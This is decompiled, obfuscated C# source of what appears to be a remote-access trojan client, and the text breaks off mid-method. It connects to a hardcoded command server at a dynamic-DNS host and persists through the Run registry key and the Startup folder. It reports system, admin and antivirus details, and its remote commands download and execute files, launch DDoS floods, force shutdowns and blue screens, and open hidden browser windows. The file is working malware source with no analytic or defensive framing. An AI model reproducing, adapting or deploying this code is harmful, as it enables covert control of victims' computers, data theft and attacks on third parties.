using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Timers;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

namespace ns0;

[StandardModule]
internal sealed class Class4
{
	public sealed class Class5
	{
		public delegate void Delegate0();

		public delegate void Delegate1();

		public delegate void Delegate2(byte[] byte_0);

		private static List<WeakReference> list_0;

		private Delegate0 delegate0_0;

		private Delegate1 delegate1_0;

		private Delegate2 delegate2_0;

		private Class14.Class15.Struct9 struct9_0;

		internal TcpClient tcpClient_0;

		static Class5()
		{
			Class6.smethod_0();
			list_0 = new List<WeakReference>();
		}

		public Class5()
		{
			smethod_0(this);
			struct9_0.bool_0 = false;
			string string_ = (string)(IEquatable<string>)"black hat";
			struct9_0.string_0 = string_;
		}

		private static void smethod_0(object object_0)
		{
			List<WeakReference> gparam_ = list_0;
			MyComputer.Class0.smethod_0((object)gparam_, 'ɷ', 'Ʌ');
			checked
			{
				try
				{
					if (list_0.Count == list_0.Capacity)
					{
						int num = 0;
						int num2 = list_0.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference gparam_2 = (WeakReference)(ISerializable)list_0[num3];
							if (MyComputer.smethod_3(gparam_2, 238, 165))
							{
								if (num3 != num)
								{
									list_0[num] = list_0[num3];
								}
								num++;
							}
							num3++;
						}
						list_0.RemoveRange(num, list_0.Count - num);
						list_0.Capacity = list_0.Count;
					}
					list_0.Add(new WeakReference(MyComputer.Class0.smethod_1(object_0, 574, 523)));
				}
				finally
				{
					Class9.Class10.smethod_0((object)gparam_, 530, 'ɍ');
				}
			}
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_0(Delegate0 delegate0_1)
		{
			delegate0_0 = (Delegate0)MyComputer.smethod_5((Delegate)delegate0_0, (Delegate)delegate0_1, 'Ż', 'ř');
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_1(Delegate0 delegate0_1)
		{
			delegate0_0 = (Delegate0)MyComputer.smethod_5((Delegate)delegate0_0, (Delegate)delegate0_1, 'ʓ', 'ʰ');
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_2(Delegate1 delegate1_1)
		{
			delegate1_0 = (Delegate1)MyComputer.smethod_5((Delegate)delegate1_0, (Delegate)delegate1_1, 'ȓ', 'ȱ');
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_3(Delegate1 delegate1_1)
		{
			delegate1_0 = (Delegate1)MyComputer.smethod_5((Delegate)delegate1_0, (Delegate)delegate1_1, 'ː', '\u02f3');
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_4(Delegate2 delegate2_1)
		{
			delegate2_0 = (Delegate2)MyComputer.smethod_5((Delegate)delegate2_0, (Delegate)delegate2_1, 'ϰ', 'ϒ');
		}

		[MethodImpl(MethodImplOptions.Synchronized)]
		[SpecialName]
		public void method_5(Delegate2 delegate2_1)
		{
			delegate2_0 = (Delegate2)MyComputer.smethod_5((Delegate)delegate2_0, (Delegate)delegate2_1, 'ļ', 'ğ');
		}

		public void method_6(string string_0, int int_0)
		{
			try
			{
				try
				{
					if (tcpClient_0 != null)
					{
						MyComputer.Class0.smethod_2(tcpClient_0, 'ô', 158);
						TcpClient tcpClient = (tcpClient_0 = null);
					}
				}
				catch (Exception gparam_)
				{
					Attribute0.smethod_1(gparam_, 'f', 13);
					MyComputer.Class0.smethod_3('\u0366', 892);
				}
				while (struct9_0.bool_0)
				{
					Class6.smethod_7(1, 'Æ', 230);
				}
				try
				{
					TcpClient tcpClient2 = (tcpClient_0 = new TcpClient());
					MyComputer.smethod_7(tcpClient_0, string_0, int_0, 497, 496);
				}
				catch (Exception gparam_2)
				{
					Attribute0.smethod_1(gparam_2, 'ɿ', 532);
					MyComputer.Class0.smethod_3('ǣ', 505);
				}
				Thread gparam_3 = new Thread(method_10, 10);
				MyComputer.smethod_8(gparam_3, 'ϯ', 'Β');
				((Delegate0)(MulticastDelegate)delegate0_0)?.Invoke();
			}
			catch (Exception gparam_4)
			{
				Class9.smethod_3(gparam_4, 'ƫ', 404);
				delegate1_0?.Invoke();
				Class9.Class10.smethod_1(399, 427);
			}
		}

		public void method_7()
		{
			try
			{
				MyComputer.Class0.smethod_2(tcpClient_0, 'ƚ', 496);
			}
			catch (Exception gparam_)
			{
				Attribute0.smethod_1(gparam_, 'ό', 935);
				MyComputer.Class0.smethod_3('Ξ', 900);
			}
			TcpClient tcpClient = (tcpClient_0 = null);
			((Delegate1)(Delegate)delegate1_0)?.Invoke();
		}

		public void method_8(string string_0)
		{
			method_9(smethod_7(string_0));
		}

		public void method_9(byte[] byte_0)
		{
			try
			{
				MemoryStream gparam_ = new MemoryStream();
				MyComputer.smethod_9(gparam_, byte_0, 0, byte_0.Length, 649, 681);
				MyComputer.smethod_9(gparam_, smethod_7(struct9_0.string_0), 0, Class6.smethod_8(struct9_0.string_0, 'Ϗ', 930), 745, 713);
				Class9.smethod_6(Class6.Class7.smethod_2(tcpClient_0, 830, 793), Class6.smethod_5(gparam_, 502, 508), 0, checked((int)MyComputer.smethod_10(gparam_, 164, 255)), SocketFlags.None, '(', '$');
			}
			catch (Exception gparam_2)
			{
				Class9.smethod_3(gparam_2, 'ā', 318);
				method_7();
				Class9.Class10.smethod_1(1023, 987);
			}
		}

		private void method_10()
		{
			struct9_0.bool_0 = true;
			MemoryStream gparam_ = new MemoryStream();
			int num = 0;
			checked
			{
				while (true)
				{
					Class6.smethod_7(1, 'ø', 216);
					try
					{
						if (tcpClient_0 == null || !MyComputer.smethod_11(Class6.Class7.smethod_2(tcpClient_0, 861, 890), 827, 776))
						{
							break;
						}
						num++;
						if (num > 100)
						{
							num = 0;
							try
							{
								if (MyComputer.Class0.smethod_4(Class6.Class7.smethod_2(tcpClient_0, 304, 279), -1, SelectMode.SelectRead, 19, 20) & (MyComputer.smethod_12(Class6.Class7.smethod_2(tcpClient_0, 10, 45), 'Ν', 949) <= 0))
								{
									break;
								}
							}
							catch (Exception gparam_2)
							{
								Attribute0.smethod_1(gparam_2, '¿', 212);
								MyComputer.Class0.smethod_3('\u009b', 129);
								goto end_IL_0019;
							}
						}
						if (Attribute0.smethod_4(tcpClient_0, 'ȷ', 557) <= 0)
						{
							continue;
						}
						byte[] array = new byte[Attribute0.smethod_4(tcpClient_0, 'ɉ', 595) - 1 + 1];
						Class6.smethod_9(Class6.Class7.smethod_2(tcpClient_0, 582, 609), array, 0, array.Length, SocketFlags.None, 860, 873);
						MyComputer.smethod_9(gparam_, array, 0, array.Length, 977, 1009);
						while (Attribute0.smethod_5(smethod_8(Class6.smethod_5(gparam_, 776, 770)), struct9_0.string_0, 231, 184))
						{
							Array gparam_3 = (Array)(ICloneable)smethod_9(Class6.smethod_5(gparam_, 862, 852), struct9_0.string_0);
							delegate2_0?.Invoke((byte[])Class6.smethod_10((object)gparam_3, new object[1] { 0 }, (string[])null, 540, 597));
							Attribute0.smethod_6((Stream)gparam_, '\u02f9', 'ʫ');
							gparam_ = new MemoryStream();
							if (Attribute0.smethod_7(gparam_3, 887, 845) == 2)
							{
								Class12.smethod_5(gparam_, (byte[])Class12.smethod_0((object)gparam_3, new object[1] { 1 }, (string[])null, 'ɐ', 'ɹ'), 0, Class9.Class11.smethod_2(Class9.Class10.smethod_6<string, object, Type>(Class12.smethod_0((object)gparam_3, new object[1] { 1 }, (string[])null, 'Ț', 'ȳ'), null, "length", new object[0], null, null, null, 188, 186), 560, 'Ʌ'), 612, 584);
								Class12.Class13.smethod_3(1, 'N', 18);
								continue;
							}
							break;
						}
						continue;
						end_IL_0019:;
					}
					catch (Exception gparam_4)
					{
						Class9.smethod_3(gparam_4, '\u02d8', 743);
						Class14.smethod_0('Ă', 307);
					}
					break;
				}
				struct9_0.bool_0 = false;
				method_7();
			}
		}
	}

	private static Class5 class5_0;

	public static string string_0;

	public static string string_1;

	public static string string_2;

	public static string string_3;

	public static string string_4;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	public static string string_10;

	public static object object_0;

	private static System.Timers.Timer timer_0;

	private static string string_11;

	private static string string_12;

	private static string string_13;

	private static string string_14;

	private static string string_15;

	private static System.Timers.Timer timer_1;

	private static Mutex mutex_0;

	static Class4()
	{
		Class6.smethod_0();
		smethod_1(new Class5());
		string_0 = "\\worms\\.";
		string_1 = "btc1234.ddns.net";
		string_2 = "1996";
		string_3 = "NEW";
		string_4 = "EVbzmNBCWkltgcQS";
		string_5 = "private.txt.exe";
		string_6 = "yes";
		string_7 = "yes";
		string_8 = "yes";
		string_9 = "[pastebinn]";
		string_10 = "[urll]";
		timer_0 = new System.Timers.Timer();
		string_12 = Class6.smethod_11(Environment.SpecialFolder.ApplicationData, 992, 'ϒ');
		string_13 = Attribute0.smethod_8('\u00a0', 159);
		string_14 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
		string_15 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
		timer_1 = new System.Timers.Timer();
	}

	[SpecialName]
	public static Class5 smethod_0()
	{
		return class5_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public static void smethod_1(Class5 class5_1)
	{
		Class5.Delegate2 delegate2_ = smethod_4;
		Class5.Delegate1 delegate1_ = smethod_3;
		Class5.Delegate0 delegate0_ = smethod_2;
		if (class5_0 != null)
		{
			class5_0.method_5(delegate2_);
			class5_0.method_3(delegate1_);
			class5_0.method_1(delegate0_);
		}
		class5_0 = class5_1;
		if (class5_0 != null)
		{
			class5_0.method_4(delegate2_);
			class5_0.method_2(delegate1_);
			class5_0.method_0(delegate0_);
		}
	}

	[DllImport("winmm.dll")]
	private static extern int mciSendString(string string_16, string string_17, int int_0, IntPtr intptr_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_0, int int_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_16, int int_2);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		Class6.smethod_0();
		try
		{
			string gparam_ = (string)(IEnumerable<char>)Attribute0.smethod_8('Ĺ', 377);
			gparam_ = (string)(IEnumerable<char>)Attribute0.smethod_9(gparam_, 101, '#');
			Attribute0.smethod_10(gparam_, 314, 278);
		}
		catch (Exception gparam_2)
		{
			Attribute0.smethod_1(gparam_2, 'ı', 346);
			MyComputer.Class0.smethod_3('\u035e', 836);
		}
		bool createdNew = false;
		mutex_0 = new Mutex(initiallyOwned: true, string_4, out createdNew);
		if (!createdNew)
		{
			MyComputer.Class0.smethod_3('\u0303', 792);
		}
		try
		{
			if (MyComputer.Class0.smethod_5(string_6, "yes", bool_0: false, 'ø', 'Ù') == 0)
			{
				Class6.smethod_13(MyComputer.smethod_14(MyComputer.smethod_13<RegistryProxy>(Class6.Class7.smethod_3<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, (short)219, 'ô'), (short)1017, 961), string_14, bool_0: true, 946, 925), Attribute0.smethod_9(string_13, 795, '\u035c'), (object)Class6.smethod_12(string_12, "\\", Attribute0.smethod_9(string_13, 867, '\u032b'), 0, 'E'), 754, (short)694);
				MyComputer.smethod_15(string_13, Class6.smethod_12(string_12, "\\", Attribute0.smethod_9(string_13, 193, '\u0089'), 103, '"'), '\u031a', 833);
			}
		}
		catch (Exception gparam_3)
		{
			Attribute0.smethod_1(gparam_3, 'ʤ', 719);
			MyComputer.Class0.smethod_3('Ϣ', 1016);
		}
		if (MyComputer.Class0.smethod_5(string_7, "yes", bool_0: false, '\u0356', 'ͷ') == 0)
		{
			Class6.smethod_14<System.Timers.Timer, ElapsedEventHandler>(timer_0, smethod_10, 76, 105);
			Attribute0.smethod_11(timer_0, Class6.Class7.smethod_4("2000", 49, 'e'), '\u001b', 120);
			MyComputer.Class0.smethod_6(timer_0, 55, 'n');
		}
		if (MyComputer.Class0.smethod_5(string_8, "yes", bool_0: false, 'Z', '{') == 0)
		{
			try
			{
				string text = (string)(IEquatable<string>)Attribute0.smethod_12(Class6.smethod_11(Environment.SpecialFolder.Startup, 919, 'Υ'), "\\", Attribute0.smethod_9(string_13, 399, 'ǈ'), ".exe", 527, 'ȅ');
				if (!MyComputer.Class0.smethod_7(text, 49, 68))
				{
					MyComputer.smethod_15(Attribute0.smethod_8('Ğ', 289), text, 'ǟ', 388);
					Attribute0.smethod_13(text, FileAttributes.Temporary, 890, '\u0331');
				}
				object_0 = new FileStream(text, FileMode.Open);
			}
			catch (Exception gparam_4)
			{
				Class9.smethod_3(gparam_4, '\u008d', 178);
				Class9.Class10.smethod_1(252, 216);
			}
		}
		int try02c1_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try02c1_dispatch)
				{
				default:
					if (Class12.smethod_2(string_9, "yes", bool_0: false, 434, 'Ƴ') == 0)
					{
						WebClient gparam_5 = new WebClient();
						string gparam_6 = (string)(IEnumerable)Class9.smethod_16(gparam_5, string_10, 579, 604);
						string_1 = Class9.Class11.smethod_3(gparam_6, new char[1] { ':' }, 647, 692)[0];
						string_2 = Class9.Class11.smethod_3(gparam_6, new char[1] { ':' }, 1022, 973)[1];
						Class12.Class13.smethod_10((Component)gparam_5, 341, 303);
						smethod_0().method_6(string_1, Class9.Class11.smethod_15(string_2, 1000, 966));
					}
					else
					{
						smethod_0().method_6(string_1, Class9.Class11.smethod_15(string_2, 241, 223));
					}
					break;
				}
				break;
			}
			catch (Exception gparam_7)
			{
				Class14.Class15.smethod_7(gparam_7, 348, 299);
				Class14.Class15.smethod_1(4000, 188, 162);
				Class14.smethod_0('ʞ', 687);
				try02c1_dispatch = 706;
			}
		}
	}

	private static void smethod_2()
	{
	}

	private static void smethod_3()
	{
		try
		{
			smethod_0().method_6(string_1, Class6.smethod_8(string_2, '\u02f5', 667));
		}
		catch (Exception gparam_)
		{
			Attribute0.smethod_1(gparam_, '¹', 210);
			Class9.Class10.smethod_1(105, 77);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void smethod_4(byte[] byte_0)
	{
		string gparam_ = (string)(IEnumerable)smethod_8(byte_0);
		string[] array = Class6.Class7.smethod_5(gparam_, string_0, -1, (CompareMethod)0, 369, 'ŏ');
		checked
		{
			try
			{
				string gparam_2 = array[0];
				if (MyComputer.Class0.smethod_5(gparam_2, "~", bool_0: false, 'Ā', 'ġ') == 0)
				{
					string gparam_3 = (string)(IEnumerable)smethod_5();
					string text = (string)((MyComputer.Class0.smethod_5(Attribute0.smethod_9(string_13, 459, 'ƃ'), string_5, bool_0: false, '\u0328', '\u0309') != 0) ? ((ICloneable)"NO") : ((ICloneable)"YES"));
					string gparam_4 = (string)(IComparable<string>)Class6.Class7.smethod_0(gparam_4, " SP", 640, 696);
					try
					{
						string[] array2 = Class6.Class7.smethod_5(Class6.Class7.smethod_6(Attribute0.smethod_14('ğ', 270), 420, 473), " ", -1, (CompareMethod)0, 460, 'ǲ');
						if (array2.Length == 1)
						{
							gparam_4 = (string)(IComparable<string>)Class6.Class7.smethod_0(gparam_4, "0", 201, 241);
						}
						gparam_4 = (string)(IComparable<string>)Class6.Class7.smethod_0(gparam_4, array2[array2.Length - 1], 916, 940);
					}
					catch (Exception gparam_5)
					{
						Attribute0.smethod_1(gparam_5, '\u02f0', 667);
						gparam_4 = (string)(IComparable<string>)Class6.Class7.smethod_0(gparam_4, "0", 634, 578);
						MyComputer.Class0.smethod_3('¬', 182);
					}
					gparam_4 = (string)((!Attribute0.smethod_5(Class6.smethod_11(Environment.SpecialFolder.ProgramFiles, 87, 'e'), "x86", 423, 504)) ? ((IComparable<string>)Class6.Class7.smethod_0(gparam_4, " x86", 602, 610)) : ((IComparable<string>)Class6.Class7.smethod_0(gparam_4, " x64", 590, 630)));
					WindowsIdentity ntIdentity = Class6.smethod_15('ɥ', 'Ƚ');
					WindowsPrincipal gparam_6 = new WindowsPrincipal(ntIdentity);
					string text2 = (string)((!Attribute0.smethod_15(gparam_6, WindowsBuiltInRole.Administrator, 690, 745)) ? ((IEnumerable<char>)"NO") : ((IEnumerable<char>)"YES"));
					string gparam_7 = Class6.Class7.smethod_7(new string[16]
					{
						Class6.smethod_12(string_3, "#", "", 611, 'ȥ'),
						"#",
						Class6.smethod_12(Attribute0.smethod_8('Ŝ', 285), "#", "", 25, '_'),
						"#",
						Class6.smethod_12(Attribute0.smethod_8('ǫ', 425), "#", "", 1003, 'έ'),
						"#",
						Class6.smethod_12(MyComputer.Class0.smethod_8<ComputerInfo>(MyComputer.smethod_16<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 754, '\u02d6'), (short)628, 'Ȁ'), "#", "", 107, '-'),
						gparam_4,
						"#v",
						Class6.smethod_12(MyComputer.Class0.smethod_8<ComputerInfo>(MyComputer.smethod_16<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 769, '\u0325'), (short)119, '\u0002'), "#", "", 989, 'Λ'),
						"#",
						text,
						"#",
						text2,
						"#",
						Class6.smethod_12(gparam_3, "#", "", 965, '\u0383')
					}, 642, 742);
					smethod_0().method_8(Class6.smethod_12("~", string_0, gparam_7, 942, 'ϫ'));
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "close", bool_0: false, 'Ć', 'ħ') == 0)
				{
					MyComputer.Class0.smethod_3(']', 70);
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "rec", bool_0: false, 'ť', 'ń') == 0)
				{
					MyComputer.Class0.smethod_3('ϰ', 1004);
					MyComputer.Class0.smethod_3('Ϭ', 1015);
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "shut", bool_0: false, 'Ş', 'ſ') == 0)
				{
					Class6.Class7.smethod_8(array[1], (AppWinStyle)0, bool_0: false, -1, 733, '\u02d7');
					array[1] = null;
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "logof", bool_0: false, 'ˆ', '\u02e7') == 0)
				{
					Class6.Class7.smethod_8(array[1], (AppWinStyle)0, bool_0: false, -1, 171, '¡');
					array[1] = null;
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "rebot", bool_0: false, '\u036c', '\u034d') == 0)
				{
					Class6.Class7.smethod_8(array[1], (AppWinStyle)0, bool_0: false, -1, 164, '®');
					array[1] = null;
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "opencd", bool_0: false, 'Ƣ', 'ƃ') == 0)
				{
					mciSendString("set CDAudio door open", null, 0, IntPtr.Zero);
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "closecd", bool_0: false, 'ϻ', 'Ϛ') == 0)
				{
					mciSendString("set CDAudio door closed", null, 0, IntPtr.Zero);
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "changeWL", bool_0: false, 'Ŧ', 'Ň') == 0)
				{
					try
					{
						string string_ = Class6.Class7.smethod_0(Attribute0.smethod_8('!', 98), "img.Bmp", 70, 126);
						byte[] byte_ = (byte[])(Array)MyComputer.Class0.smethod_9(array[1], 659, '\u02f6');
						Attribute0.smethod_16(string_, byte_, 909, 1003);
						SystemParametersInfoA(20, 0, ref string_, 1);
						array[1] = null;
						return;
					}
					catch (Exception gparam_8)
					{
						Attribute0.smethod_1(gparam_8, '\u02fb', 656);
						MyComputer.Class0.smethod_3('²', 168);
						return;
					}
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "runexe", bool_0: false, 'ʆ', 'ʧ') == 0)
				{
					try
					{
						StringBuilder gparam_9 = new StringBuilder();
						Random gparam_10 = new Random();
						int num = 1;
						do
						{
							int int_ = Class6.smethod_16(gparam_10, 0, Class6.smethod_8(string_15, 'ã', 142), 449, 419);
							char char_ = MyComputer.smethod_17(string_15, int_, 149, 162);
							Class6.smethod_17(gparam_9, char_, 770, 776);
							num++;
						}
						while (num <= 8);
						string gparam_11 = (string)(IEnumerable<char>)Attribute0.smethod_17(gparam_9, 272, 283);
						string gparam_12 = (string)(IEnumerable)Attribute0.smethod_12(Attribute0.smethod_8('ʰ', 755), gparam_11, "-tmp", Class6.Class7.smethod_9(array[1], new char[1] { ':' }, 245, 'Û')[1], 427, 'ơ');
						byte[] byte_2 = (byte[])(ICloneable)MyComputer.Class0.smethod_9(Class6.Class7.smethod_9(array[1], new char[1] { ':' }, 111, 'A')[0], 687, 'ˊ');
						Attribute0.smethod_16(gparam_12, byte_2, 937, 975);
						Attribute0.smethod_10(gparam_12, 750, 706);
						array[1] = null;
						return;
					}
					catch (Exception gparam_13)
					{
						Attribute0.smethod_1(gparam_13, 'ù', 146);
						MyComputer.Class0.smethod_3('ȋ', 529);
						return;
					}
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "fromurl", bool_0: false, 'ʕ', 'ʴ') == 0)
				{
					try
					{
						StringBuilder gparam_14 = new StringBuilder();
						Random gparam_15 = new Random();
						int num2 = 1;
						do
						{
							int int_2 = Class6.smethod_16(gparam_15, 0, Class6.smethod_8(string_15, 'ʐ', 765), 945, 979);
							char char_2 = MyComputer.smethod_17(string_15, int_2, 942, 921);
							Class6.smethod_17(gparam_14, char_2, 394, 384);
							num2++;
						}
						while (num2 <= 8);
						string gparam_16 = (string)(IComparable<string>)Attribute0.smethod_17(gparam_14, 667, 656);
						string text3 = (string)(IConvertible)Attribute0.smethod_12(Attribute0.smethod_8('\u02da', 665), gparam_16, "-", Class6.Class7.smethod_9(array[1], new char[1] { '~' }, 487, 'ǉ')[1], 351, 'ŕ');
						WebClient gparam_17 = new WebClient();
						Class6.smethod_18(gparam_17, Class6.Class7.smethod_9(array[1], new char[1] { '~' }, 867, '\u034d')[0], text3, 343, 284);
						Attribute0.smethod_10(text3, 377, 341);
						array[1] = null;
						return;
					}
					catch (Exception gparam_18)
					{
						Attribute0.smethod_1(gparam_18, '-', 70);
						MyComputer.Class0.smethod_3('ʺ', 672);
						return;
					}
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "openurl", bool_0: false, 'þ', 'ß') == 0)
				{
					Attribute0.smethod_10(array[1], 215, 251);
					array[1] = null;
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "unstall", bool_0: false, 'Ȭ', 'ȍ') == 0)
				{
					string gparam_19 = (string)(IEquatable<string>)string_13;
					string gparam_20 = array[1];
					if (MyComputer.Class0.smethod_5(string_6, "yes", bool_0: false, 'ɺ', 'ɛ') == 0)
					{
						RegistryKey gparam_21 = (RegistryKey)(MarshalByRefObject)MyComputer.smethod_14(Registry.CurrentUser, string_14, bool_0: true, 556, 515);
						Class6.smethod_19(gparam_21, Attribute0.smethod_9(string_13, 425, 'Ǯ'), bool_1: false, '\u02d9', 644);
						Attribute0.smethod_18(Class6.smethod_12(string_12, "\\", Attribute0.smethod_9(string_13, 21, ']'), 564, 'ɱ'), 995, 956);
					}
					string text4 = (string)(IComparable<string>)Class6.Class7.smethod_0(Attribute0.smethod_8('Í', 142), "del.vbs", 215, 239);
					gparam_20 = Class6.smethod_12(gparam_20, "%path%", gparam_19, 377, 'Ŀ');
					gparam_20 = Class6.smethod_12(gparam_20, "%usb%", string_5, 527, 'ɉ');
					gparam_20 = Class6.smethod_12(gparam_20, "%startup%", Attribute0.smethod_12(Class6.smethod_11(Environment.SpecialFolder.Startup, 298, 'Ę'), "\\", Attribute0.smethod_9(string_13, 666, '\u02dd'), ".exe", 132, '\u008e'), 41, 'o');
					StreamWriter gparam_22 = new StreamWriter(text4, append: false);
					Class6.Class7.smethod_10((TextWriter)gparam_22, gparam_20, (short)866, '\u0314');
					Class6.Class7.smethod_11(gparam_22, 769, 769);
					array[1] = null;
					Attribute0.smethod_10(text4, 586, 614);
					MyComputer.Class0.smethod_3('\u02f5', 750);
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "BSOD", bool_0: false, '\u0098', '¹') == 0)
				{
					Class6.Class7.smethod_8(array[1], (AppWinStyle)0, bool_0: false, -1, 948, 'ξ');
					array[1] = null;
					return;
				}
				if (MyComputer.Class0.smethod_5(gparam_2, "textsp", bool_0: false, '\u0325', '\u0304') == 0)
				{
					try
					{
						object gparam_23 = MyComputer.Class0.smethod_1(Class6.smethod_20("SAPI.SpVoice", "", '\u02e8', 683), 852, 865);
						object[] array3 = new object[1];
						object[] array4 = array3;
						string[] array5 = array;
						string[] array6 = array5;
						int num3 = 1;
						array4[0] = array6[1];
						object[] array7 = array3;
						object[] array8 = array7;
						bool[] array9 = new bool[1] { true };
						Class9.Class11.smethod_9<string, Type, object>(gparam_23, null, "speak", array8, null, null, array9, bool_1: true, 741, '\u02c5');
						if (array9[0])
						{
							array5[num3] = (string)Class12.smethod_21(Class9.smethod_0(array7[0], 'Ń', 371), typeof(string), 105, 60);
						}
						array[1] = null;
						return;
					}
					catch (Exception gparam_24)
					{
						Class9.smethod_3(gparam_24, 'Ĭ', 275);
						Class9.Class10.smethod_1(627, 599);
						return;
					}
				}
				if (Class12.smethod_2(gparam_2, "ddos", bool_0: false, 729, '\u02d8') == 0)
				{
					string_11 = array[1];
					Class9.Class11.smethod_18<System.Timers.Timer, ElapsedEventHandler>(timer_1, smethod_6, 178, 148);
					Class9.smethod_11(timer_1, 1.0, 767, 'ʭ');
					Class9.Class10.smethod_5(timer_1, 48, '$');
					array[1] = null;
					return;
				}
				if (Class12.smethod_2(gparam_2, "ddosstop", bool_0: false, 933, 'Τ') == 0)
				{
					Class9.Class10.smethod_5(timer_1, 198, 'Ó');
					array[1] = null;
					return;
				}
				if (Class12.smethod_2(gparam_2, "admin", bool_0: false, 992, 'ϡ') == 0)
				{
					try
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						new Process();
						ProcessStartInfo gparam_25 = processStartInfo;
						Class12.Class13.smethod_19(gparam_25, bool_0: true, 'Ĭ', 355);
						Class12.smethod_22(gparam_25, Class12.Class13.smethod_2('ʂ', 652), 'ɭ', 'Ȃ');
						Class9.Class10.smethod_19(gparam_25, ProcessWindowStyle.Normal, 68, 2);
						Class12.smethod_22(gparam_25, "runas", 'Ϧ', 'Ζ');
						gparam_25 = null;
						Class9.Class10.smethod_20(processStartInfo, 168, 231);
						Class9.Class10.smethod_1(343, 370);
						return;
					}
					catch (Exception gparam_26)
					{
						Class9.smethod_3(gparam_26, 'Ζ', 937);
						Class9.Class10.smethod_1(762, 734);
						return;
					}
				}
				if (Class12.smethod_2(gparam_2, "openhide", bool_0: false, 504, 'ǹ') == 0)
				{
					try
					{
						object gparam_27 = Class9.smethod_0(Class9.Class11.smethod_21("internetexplorer.application", "", '¤', 234), 'ȯ', 543);
						object[] array7 = new object[1];
						object[] array10 = array7;
						string[] array5 = array;
						string[] array11 = array5;
						int num3 = 1;
						array10[0] = array11[1];
						object[] array3 = array7;
						object[] array12 = array3;
						bool[] array9 = new bool[1] { true };
						Class9.Class11.smethod_9<string, Type, object>(gparam_27, null, "navigate", array12, null, null, array9, bool_1: true, 688, 'ʐ');
						if (array9[0])
						{
							array5[num3] = (string)Class12.smethod_21(Class9.smethod_0(array3[0], 'Ǵ', 452), typeof(string), 887, 802);
						}
						Class9.Class10.smethod_21<Type, object, string>(gparam_27, null, "visible", new object[1] { 0 }, null, null, 464, 'Ǿ');
						array[1] = null;
						return;
					}
					catch (Exception gparam_28)
					{
						Class14.Class15.smethod_7(gparam_28, 874, 797);
						Class14.smethod_0('ɫ', 602);
						return;
					}
				}
				if (Class14.Class15.smethod_15(gparam_2, "closehide", bool_0: false, 421, 428) == 0)
				{
					Class14.Class16.smethod_3(array[1], (AppWinStyle)0, bool_0: false, -1, 'ə', 'Ȓ');
					array[1] = null;
				}
			}
			catch (Exception gparam_29)
			{
				Class14.Class15.smethod_7(gparam_29, 481, 406);
				Class14.smethod_0('ó', 194);
			}
		}
	}

	public static string smethod_5()
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectEnumerator val = default(ManagementObjectEnumerator);
			try
			{
				val = Class6.smethod_22<ManagementObjectCollection>(MyComputer.Class0.smethod_10<ManagementObjectSearcher>(new ManagementObjectSearcher(Class6.Class7.smethod_0("root\\SecurityCenter", Attribute0.smethod_19(Class6.smethod_21(Attribute0.smethod_5(MyComputer.Class0.smethod_8<ComputerInfo>(MyComputer.smethod_16<ServerComputer>((ServerComputer)(object)MyProject.MyComputer_0, 612, 'ɀ'), (short)495, 'ƛ'), "XP", 940, 1011), (object)"", (object)"2", (short)349, 335), 901, 'Ϊ'), 298, 274), "SELECT * FROM AntiVirusProduct"), 459, (short)399), 'Å', 'ý');
				while (val.MoveNext())
				{
					ManagementObject gparam_ = (ManagementObject)val.get_Current();
					text = Class6.smethod_12(text, " ", Attribute0.smethod_19(Class6.Class7.smethod_12<ManagementBaseObject, string>((ManagementBaseObject)(object)gparam_, "displayName", '\u02db', 720), 88, 'w'), 425, 'Ǭ');
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			if (MyComputer.Class0.smethod_5(text, string.Empty, bool_0: false, 'ͷ', '\u0356') != 0)
			{
